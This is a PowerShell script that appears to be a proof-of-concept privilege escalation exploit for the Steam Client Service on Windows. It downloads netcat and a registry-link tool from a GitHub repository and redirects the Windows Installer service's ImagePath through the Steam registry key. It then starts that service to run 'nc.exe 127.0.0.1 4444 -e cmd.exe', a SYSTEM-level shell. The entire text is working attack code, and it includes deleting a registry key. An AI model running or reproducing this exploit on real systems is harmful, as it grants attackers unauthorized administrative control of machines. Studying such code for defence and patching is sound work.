﻿$SteamRegKey = "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\NSIS"
$MSIRegKey = "HKLM:\SYSTEM\CurrentControlSet\Services\msiserver" 
$RegDir = "C:\Windows\Temp\RegLN.exe"
$PayDir = "C:\Windows\Temp\payload.exe"
$Payload = "c:\windows\system32\cmd.exe /c c:\windows\temp\payload.exe 127.0.0.1 4444 -e cmd.exe"
$PayDownload = "https://raw.githubusercontent.com/AbsoZed/SteamPrivEsc/master/nc.exe"
$RegDownload = "https://raw.githubusercontent.com/AbsoZed/SteamPrivEsc/master/RegLN.exe"
$WebClient = New-Object System.Net.WebClient


If(!((Test-Path -Path $RegDir) -And (Test-Path -Path $PayDir)))
{
$WebClient.DownloadFile($PayDownload, $PayDir)
$WebClient.DownloadFile($RegDownload, $RegDir)
}

If(Get-ItemProperty -Path $SteamRegKey -Name ImagePath -ErrorAction SilentlyContinue)
{
Start-Service -DisplayName "Steam Client Service"
Set-ItemProperty -Path $MSIRegKey -Name "ImagePath" -Value $Payload
Start-Service -Name "msiserver"
}
Else
{
Remove-Item -Path $SteamRegKey -Recurse
Start-Process -FilePath $RegDir -ArgumentList "HKLM\Software\Wow6432Node\Valve\Steam\NSIS HKLM\SYSTEM\CurrentControlSet\Services\msiserver"
Start-Service -DisplayName "Steam Client Service"
Set-ItemProperty -Path $MSIRegKey -Name "ImagePath" -Value $Payload
Start-Service -Name "msiserver"
}


